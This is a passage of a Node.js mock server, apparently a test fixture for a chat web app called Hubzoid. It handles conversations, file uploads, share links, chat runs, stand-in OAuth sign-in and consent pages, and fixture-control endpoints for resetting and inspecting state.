        return send(res, 200, { conversation: convOut(conv), messages: messagesOf(conv.id).map(msgOut), head_id: conv.head_id });
      if (method === "PATCH") {
        const body = await readJson(req);
        if (typeof body.title === "string") {
          conv.title = body.title.trim().slice(0, 200) || conv.title;
          conv.title_source = "user";
        }
        if (typeof body.archived === "boolean") conv.archived = body.archived;
        if (typeof body.head_id === "string") {
          const head = state.messages.get(body.head_id);
          if (!head || head.conversation_id !== conv.id) throw fail(400, "bad_head", "head_id isn't in this conversation.");
          conv.head_id = body.head_id;
        }
        return send(res, 200, { conversation: convOut(conv) });
      }
      if (method === "DELETE") {
        if (conv.hub !== hub) throw fail(409, "wrong_hub", "Delete this conversation on its own hub.");
        for (const msg of messagesOf(conv.id)) state.messages.delete(msg.id);
        for (const [sid, share] of state.shares) if (share.conversation_id === conv.id) state.shares.delete(sid);
        for (const [fid, f] of state.files) if (f.conversation_id === conv.id) state.files.delete(fid);
        state.conversations.delete(conv.id);
        return send(res, 204);
      }
    }
    if ((m = /^\/api\/conversations\/([^/]+)\/files$/.exec(pathname)) && method === "POST") {
      const user = requireUser(req);
      const conv = ownedConversation(user, decodeURIComponent(m[1]));
      if (conv.hub !== hub) throw fail(409, "wrong_hub", "Upload to the conversation's own hub.");
      const raw = await readBody(req);
      const file = parseMultipart(raw, req.headers["content-type"]);
      if (file.body.length > MAX_UPLOAD) throw fail(413, "too_large", `${file.filename} is larger than 25 MB, the limit for one file.`);
      if (state.flags.upload_slow) await sleep(900);
      const fileId = rid("f_", 16);
      state.files.set(fileId, { conversation_id: conv.id, owner_id: user.id, name: file.filename, mime: file.type, size: file.body.length, data: file.body });
      return send(res, 201, { file_id: fileId, name: file.filename, size: file.body.length, mime: file.type, kind: file.type.startsWith("image/") ? "image" : "file" });
    }
    if ((m = /^\/api\/conversations\/([^/]+)\/files\/([^/]+)$/.exec(pathname)) && method === "GET") {
      const user = requireUser(req);
      ownedConversation(user, decodeURIComponent(m[1]));
      const f = state.files.get(decodeURIComponent(m[2]));
      if (!f || f.owner_id !== user.id) throw fail(404, "not_found", "No such file.");
      res.writeHead(200, { "content-type": f.mime, "content-length": f.data.length, "cache-control": "private, max-age=60" });
      return res.end(f.data);
    }
    if ((m = /^\/api\/conversations\/([^/]+)\/share$/.exec(pathname))) {
      const user = requireUser(req);
      const conv = ownedConversation(user, decodeURIComponent(m[1]));
      const existing = [...state.shares.entries()].find(([, s]) => s.conversation_id === conv.id);
      if (method === "GET") {
        if (!existing) throw fail(404, "not_found", "This conversation isn't shared.");
        return send(res, 200, { share_id: existing[0], url: `/s/${existing[0]}` });
      }
      if (method === "POST") {
        const shareId = existing ? existing[0] : rid("s", 20);
        state.shares.set(shareId, {
          conversation_id: conv.id,
          snapshot: {
            title: conv.title,
            agent: conv.agent,
            owner_name: user.name,
            created_at: now(),
            messages: branchTo(conv.head_id).map(msgOut),
          },
        });
        return send(res, 200, { share_id: shareId, url: `/s/${shareId}` });
      }
      if (method === "DELETE") {
        if (existing) state.shares.delete(existing[0]);
        return send(res, 204);
      }
    }
    if ((m = /^\/api\/shares\/([^/]+)$/.exec(pathname)) && method === "GET") {
      requireUser(req);
      const share = state.shares.get(decodeURIComponent(m[1]));
      if (!share) throw fail(404, "not_found", "This shared link doesn't exist.");
      return send(res, 200, share.snapshot);
    }
    if (pathname === "/api/chat" && method === "POST") {
      const user = requireUser(req);
      return chat(req, res, user, hub);
    }
    if ((m = /^\/api\/runs\/([^/]+)\/cancel$/.exec(pathname)) && method === "POST") {
      const user = requireUser(req);
      const run = state.runs.get(decodeURIComponent(m[1]));
      if (!run) throw fail(404, "not_found", "No such run.");
      if (run.conv.owner_id !== user.id) throw fail(403, "forbidden", "Not your run.");
      run.cancelled = true;
      record.cancelled = run.message.id;
      return send(res, 202, { status: "cancelling" });
    }
    if ((m = /^\/api\/runs\/([^/]+)$/.exec(pathname)) && method === "GET") {
      const user = requireUser(req);
      const msg = state.messages.get(decodeURIComponent(m[1]));
      if (!msg) throw fail(404, "not_found", "No such run.");
      ownedConversation(user, msg.conversation_id);
      return send(res, 200, { status: msg.status, message: msgOut(msg) });
    }
    if ((m = /^\/artifacts\/([^/]+)\/([^/]+)$/.exec(pathname)) && method === "GET") {
      const user = requireUser(req);
      ownedConversation(user, decodeURIComponent(m[1]));
      if (m[2].endsWith(".png")) {
        res.writeHead(200, { "content-type": "image/png", "cache-control": "private, max-age=60" });
        return res.end(TINY_PNG);
      }
      res.writeHead(200, { "content-type": "text/csv", "content-disposition": `attachment; filename="${m[2]}"` });
      return res.end("quarter,revenue\nQ1,120\nQ2,135\nQ3,151\n");
    }
    throw fail(404, "not_found", `No route for ${method} ${url.pathname}.`);
  }

  function staticFile(res, file) {
    if (!file.startsWith(dist) || !fs.existsSync(file) || !fs.statSync(file).isFile()) return false;
    res.writeHead(200, { "content-type": TYPES[path.extname(file)] || "application/octet-stream", "cache-control": "no-store" });
    res.end(fs.readFileSync(file));
    return true;
  }

  function page(res) {
    const index = path.join(dist, "index.html");
    if (!fs.existsSync(index)) return send(res, 503, { detail: { code: "not_built", message: "Run npm run build in portal/ first." } });
    res.writeHead(200, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" });
    res.end(fs.readFileSync(index));
  }

  let consoleFixture = null;
  function consoleApi() {
    if (!consoleFixture) consoleFixture = require("./fixture.cjs").createFixture();
    return consoleFixture;
  }

  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    try {
      if (url.pathname.startsWith("/__fixture/")) {
        const [, , command, a, b] = url.pathname.split("/");
        if (command === "reset") {
          const mode = state.mode;
          state = seed();
          state.mode = mode;
          return send(res, 200, { ok: true });
        }
        if (command === "expire") {
          state.sessions.clear();
          return send(res, 200, { ok: true });
        }
        if (command === "mode" && ["local", "accounts"].includes(a)) {
          state.mode = a;
          return send(res, 200, { ok: true, mode: a });
        }
        if (command === "flag" && a in state.flags) {
          state.flags[a] = b === "true" || b === "1";
          return send(res, 200, { ok: true, flags: state.flags });
        }
        if (command === "state")
          return send(res, 200, {
            mode: state.mode,
            flags: state.flags,
            requests: state.requests,
            conversations: [...state.conversations.values()].map((c) => ({ ...c })),
            messages: [...state.messages.values()],
            shares: [...state.shares.entries()].map(([id, s]) => ({ id, conversation_id: s.conversation_id })),
            files: [...state.files.entries()].map(([id, f]) => ({ id, name: f.name, size: f.size, mime: f.mime, conversation_id: f.conversation_id })),
          });
        if (command === "provider" && a) {
          // A stand-in OAuth consent page for a personal connection.
          const flow = url.searchParams.get("state");
          res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
          return res.end(
            `<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Authorize</title>` +
              `<body style="font:15px system-ui;padding:40px"><h1>Authorize Hubzoid</h1><p>Allow Hubzoid to use your ${a} account?</p>` +
              `<a id="allow" href="/oauth/connectors/${a}/callback?state=${flow}&code=ok">Allow</a> · ` +
              `<a id="deny" href="/oauth/connectors/${a}/callback?state=${flow}&error=access_denied">Deny</a></body>`,
          );
        }
        if (command === "google") {
          const redirect = url.searchParams.get("redirect") || "/";
          res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
          return res.end(
            `<!doctype html><meta charset="utf-8"><title>Google</title><body style="font:15px system-ui;padding:40px"><h1>Choose an account</h1>` +
              `<a id="pick" href="/oauth/google/callback?code=ok&redirect=${encodeURIComponent(redirect)}">sam@example.com</a> · ` +
              `<a id="deny" href="/oauth/google/callback?error=access_denied">Cancel</a></body>`,
          );
        }
        return send(res, 404, { detail: "unknown fixture command" });
      }
      if (url.pathname === "/oauth/google/login") {
        const redirect = url.searchParams.get("redirect") || "/";
        res.writeHead(302, { location: `/__fixture/google?redirect=${encodeURIComponent(redirect)}` });
        return res.end();
      }
      if (url.pathname === "/oauth/google/callback") {
        if (url.searchParams.get("error")) {
          res.writeHead(302, { location: `/auth?error=${encodeURIComponent(url.searchParams.get("error"))}` });
          return res.end();
        }
        const user = userByEmail("sam@example.com");
        startSession(res, user);
        const redirect = url.searchParams.get("redirect") || "/";
        res.writeHead(302, { location: redirect.startsWith("/") && !redirect.startsWith("//") ? redirect : "/" });
        return res.end();
      }
      let m;
      if ((m = /^\/oauth\/connectors\/([^/]+)\/callback$/.exec(url.pathname))) {
        if (url.searchParams.get("error")) {
          res.writeHead(302, {
            location: `/account/connections?connector=${encodeURIComponent(m[1])}&error=${encodeURIComponent(url.searchParams.get("error"))}`,
          });
          return res.end();
        }
        const flow = state.flows.get(url.searchParams.get("state"));
        if (flow) {
          state.tokens.set(`${flow.user}:${flow.connector}`, { connected_at: now(), status: "active" });
          state.flows.delete(url.searchParams.get("state"));
        }
        res.writeHead(302, { location: `/account/connections?connected=${encodeURIComponent(m[1])}` });
        return res.end();
      }
      if (url.pathname === "/mcp/oauth/consent") {
        // The hosted MCP server's consent page: a server page outside the chat
        // app that sends a signed-out person to sign in and back.
        if (!currentUser(req)) {
          res.writeHead(303, { location: `/auth?redirect=${encodeURIComponent(url.pathname + url.search)}` });
          return res.end();
        }
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        return res.end(`<!doctype html><meta charset="utf-8"><title>Connect</title><h1>Allow Claude to use Hubzoid Guide?</h1>`);
      }
      if (url.pathname.startsWith("/branding/")) {
        // The hub's branding folder (public: the sign-in page shows it too).
        const files = {
          "logo.svg": ["image/svg+xml", `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="8" fill="#1f6f5c"/><path d="M9 22l7-13 7 13h-4l-3-6-3 6z" fill="#fff"/></svg>`],
          "favicon.svg": ["image/svg+xml", `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="8" fill="#1f6f5c"/></svg>`],
          "custom.css": ["text/css", `/* Acme Support */\n:root { --acme-brand: #1f6f5c; }\n`],
        };
        const file = files[url.pathname.slice("/branding/".length)];
        if (!file) return send(res, 404, { detail: "not found" });
        res.writeHead(200, { "content-type": file[0], "cache-control": "no-store" });
        return res.end(file[1]);
      }
      if (url.pathname.startsWith("/portal/api/")) {
        const endpoint = url.pathname.slice("/portal/api".length);
        let body;
        if (req.method === "POST") body = await readJson(req);
        try {
          const data = await consoleApi().handle(req.method, endpoint, Object.fromEntries(url.searchParams), body);
          return send(res, 200, data);
        } catch (e) {
          return send(res, e.status || 500, { detail: e.detail || String(e) });
        }
      }
      if (url.pathname.startsWith("/api/") || /^\/b\/[^/]+\/(api|artifacts)\//.test(url.pathname) || url.pathname.startsWith("/artifacts/"))
        return await api(req, res, url);
      if (url.pathname === "/portal" || url.pathname.startsWith("/portal/")) {
        const relative = url.pathname.replace(/^\/portal\/?/, "") || "index.html";
        if (staticFile(res, path.join(dist, relative))) return;
        return page(res);
      }
      if (/^\/(c|s)\/[^/]+$/.test(url.pathname) || /^\/(auth|account|new)(\/|$)/.test(url.pathname) || url.pathname === "/") return page(res);
      return send(res, 404, { detail: { code: "not_found", message: "Not found." } });
    } catch (error) {
      const status = error.status || 500;
      if (status >= 500 && !error.status) console.error(error);
      return send(res, status, { detail: { code: error.code || "server_error", message: error.message, ...(error.extra || {}) }, ...(error.extra || {}) });
    }
  });

  return {
    server,
    get state() {
      return state;
    },
    listen(port = 0, host = "127.0.0.1") {
      return new Promise((resolve) => server.listen(port, host, () => resolve(server.address().port)));
    },
    close() {
      return new Promise((resolve) => {
        server.closeAllConnections?.();
        server.close(() => resolve());
      });
    },
  };
}

module.exports = { createApp, AGENTS, PASSWORD };

if (require.main === module) {
  const port = Number(process.argv[2] || process.env.PORT || 3410);
  const app = createApp();
  app.listen(port).then((p) => {
    console.log(`hubzoid app fixture: http://127.0.0.1:${p}/  (mode: ${app.state.mode}; password ${PASSWORD})`);
  });
}
